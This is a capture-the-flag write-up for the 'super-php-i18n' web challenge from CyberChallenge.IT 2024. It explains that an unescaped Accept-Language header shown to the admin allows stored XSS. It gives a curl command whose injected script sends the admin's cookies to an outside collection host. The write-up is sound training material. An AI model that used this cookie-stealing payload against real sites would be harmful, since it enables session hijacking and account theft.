# CyberChallenge.IT 2024 - University CTF

## [web] super-php-i18n (45 solves)

I'm publishing a new php i18n library, let me know what you think!

Site: [http://super-php-i18n.challs.external.open.ecsc2024.it:38209](http://super-php-i18n.challs.external.open.ecsc2024.it:38209)

Author: Lorenzo Leonardini <@pianka>

## Solution

super-php-i18n contains a contact form to message the admin. Every form field is escaped using `htmlentities`, so we cannot perform XSS there, but the admin also can see the user language, retrieved from the `Accept-Language` header, which is not escaped.

So we can submit the form and edit the request to have the following header:

```bash
curl -H 'Accept-Language: <script>location.href="http//bin/?"+document.cookie</script>' -X POST --data "name=a&email=a&message=a" http://super-php-i18n.challs.external.open.ecsc2024.it
```
